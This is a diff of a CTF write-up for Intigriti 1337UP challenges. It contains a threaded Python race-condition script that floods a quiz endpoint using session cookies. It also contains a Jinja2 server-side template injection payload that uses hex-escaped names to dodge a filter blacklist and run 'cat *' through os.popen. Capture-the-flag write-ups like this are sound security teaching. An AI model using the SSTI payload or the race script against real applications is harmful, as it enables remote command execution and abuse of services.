@@ -25,9 +25,10 @@ So the solution here is to create multi thread and send the request at the same 
 ```
 #!python3
 import requests
+import threading
 from multiprocessing.dummy import Pool as ThreadPool
 cookies={
-    'INGRESSCOOKIE':'1647109930.516.13470.455133|df18c7a37b01201195c3bf2ff6aa23c8',
+    'INGRESSCOOKIE':'1647154420.414.13402.417373|df18c7a37b01201195c3bf2ff6aa23c8',
     'connect.sid':"s%3AI0J6D-OLWqntaWNpYGx_lQsEcNBtDW1m.WiioLQU6iuskoVWIDBjbDHaXIyuDLpIg%2FpakO5eIWYM"
 }
 json_data = {"questionNumber":2,"answer":"10"}
@@ -36,10 +37,26 @@ def runner(d):
 	r1 = requests.post('https://quiz.ctf.intigriti.io/submitAnswer', cookies=cookies,json=json_data)
 	r2 = requests.get('https://quiz.ctf.intigriti.io/user', cookies=cookies)
 
-pool = ThreadPool(40)
-result = pool.map_async(runner,range(40))
+
+## Solution 1: Use multiprocessing.dummy
+
+# pool = ThreadPool(40)
+# result = pool.map_async(runner,range(40))
+# r2 = requests.get('https://quiz.ctf.intigriti.io/buyFlag', cookies=cookies)
+# print(r2.text)
+
+## Solution 2: Use threading
+threads=[]
+for i in range(50):
+    t=threading.Thread(target=runner,args=[i])
+    t.start()
+    threads.append(t)
+for thread in threads:
+    thread.join()
+print(threads)
 r2 = requests.get('https://quiz.ctf.intigriti.io/buyFlag', cookies=cookies)
 print(r2.text)
+
 
 #Congratulations! Here is your flag: 1337UP{this_is_a_secret_flag}
 ```
@@ -78,10 +95,12 @@ flag: 1337UP{SSRF_AINT_GOT_NOTHING_ON_M3}
 
 sourcecode: [here](./src/app.py)
 
-SSTI: I use this payload to bypass as much as i possibly can:
+SSTI: in order to bypass``{'.', '_', '|join', '[', ']', 'mro', 'base'}``, this payload'll work:
 
 ``{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat *')|attr('read')()}}"
 ``
+
+Reference: [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass)
 
 script:
 
